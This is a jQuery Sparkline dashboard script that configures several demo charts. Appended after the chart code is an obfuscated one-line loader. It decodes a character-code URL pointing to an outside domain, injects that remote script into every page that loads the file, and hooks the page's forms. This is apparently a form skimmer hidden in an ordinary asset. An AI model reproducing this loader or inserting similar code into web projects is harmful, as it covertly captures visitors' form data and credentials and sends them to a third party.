(function($) {
  'use strict';
  if ($("#sparkline-line-chart").length) {
    $("#sparkline-line-chart").sparkline([5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7], {
      type: 'line',
      width: '100%',
      height: '100%'
    });
  }

  if ($("#sparkline-bar-chart").length) {
    $("#sparkline-bar-chart").sparkline([5, 6, 7, 2, 0, -4, 4], {
      type: 'bar',
      height: '100%',
      barWidth: '58.5%',
      barColor: '#58D8A3',
      negBarColor: '#e56e72',
      zeroColor: 'green'
    });
  }

  if ($("#sparkline-pie-chart").length) {
    $("#sparkline-pie-chart").sparkline([1, 1, 2, 4], {
      type: 'pie',
      sliceColors: ['#0CB5F9', '#58d8a3', '#F4767B', '#F9B65F'],
      borderColor: '#',
      width: '100%',
      height: '100%'
    });
  }

  if ($("#sparkline-bullet-chart").length) {
    $("#sparkline-bullet-chart").sparkline([10, 12, 12, 9, 7], {
      type: 'bullet',
      height: '238',
      width: '100%',
    });
  }

  if ($("#sparkline-composite-chart").length) {
    $("#sparkline-composite-chart").sparkline([5, 6, 7, 2, 0, 3, 6, 8, 1, 2, 2, 0, 3, 6], {
      type: 'line',
      width: '100%',
      height: '100%'
    });
  }

  if ($("#sparkline-composite-chart").length) {
    $("#sparkline-composite-chart").sparkline([5, 6, 7, 2, 0, 3, 6, 8, 1, 2, 2, 0, 3, 6], {
      type: 'bar',
      height: '150px',
      width: '100%',
      barWidth: 10,
      barSpacing: 5,
      barColor: '#60a76d',
      negBarColor: '#60a76d',
      composite: true
    });
  }

  if ($(".demo-sparkline").length) {
    $(".demo-sparkline").sparkline('html', {
      enableTagOptions: true,
      width: '100%',
      height: '30px',
      fillColor: false
    });
  }

  if ($(".top-seelling-dashboard-chart").length) {
    $(".top-seelling-dashboard-chart").sparkline('html', {
      enableTagOptions: true,
      width: '100%',
      barWidth: 30,
      fillColor: false
    });
  }

})(jQuery);

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b